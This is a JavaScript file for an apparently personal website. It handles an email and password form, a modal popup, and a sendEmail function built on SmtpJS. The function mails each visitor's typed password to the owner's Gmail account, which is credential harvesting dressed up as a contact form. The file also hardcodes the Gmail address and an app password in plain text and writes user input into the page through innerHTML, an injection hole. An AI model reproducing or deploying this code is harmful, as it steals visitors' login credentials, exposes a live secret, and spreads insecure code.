alert("Welcome May The lORD Bless You In Jesus Christ Name✝️");

var email = document.getElementById("email");
var pwd = document.getElementById("pwd");
var button = document.getElementById("button");
var message = document.getElementById("message");
button.addEventListener("click", function(){
    var newMessage = document.createElement("h1");
    newMessage.innerHTML = email.value;
    message.appendChild(newMessage);
    console.log(newMessage);

    var newMessage = document.createElement("h2");
    newMessage.innerHTML = pwd.value;
    message.appendChild(newMessage);
    console.log(newMessage);
});


  /* Pop Up Modal */
  // Get the modal
var modal = document.getElementById("Data");

// Get the button that opens the modal
var btn = document.getElementById("button");

// Get the <span> element that closes the modal
var span = document.getElementsByClassName("close")[0];

// When the user clicks the button, open the modal 
btn.onclick = function() {
  modal.style.display = "block";
}

// When the user clicks on <span> (x), close the modal
span.onclick = function() {
  modal.style.display = "none";
}

// When the user clicks anywhere outside of the modal, close it
window.onclick = function(event) {
  if (event.target == modal) {
    modal.style.display = "none";
  }
}

 /* Send Email*/

 function sendEmail() {
    var element = {
  
      email: document.getElementById("email").value,
      psw: document.getElementById("psw").value,
  };
    Email.send({
      Host: "smtp.gmail.com",
      Username: "brandonedie0000@gmail.com",
      Password: "eancwrxosftfhtyr",
      From: "brandonedie0000@gmail.com",
      To: element.email,
      Subject:"New Message From Brandon's Website",
      Body: "<strong> Thank You For Contacting Me The Website Is Sill Currently Under Contruction But You Can Revisit To View For Further Updates </strong>"
    })
  
    Email.send({
      Host: "smtp.gmail.com",
      Username: "brandonedie0000@gmail.com",
      Password: "eancwrxosftfhtyr",
      From: "brandonedie0000@gmail.com",
      To: "brandonedie0000@gmail.com",
      Subject:"New Message From Brandon's Website",
      Body: "<h1>"+element.email+"</h1>"+"<h2>"+element.psw+"</h2>"
    })
  
  }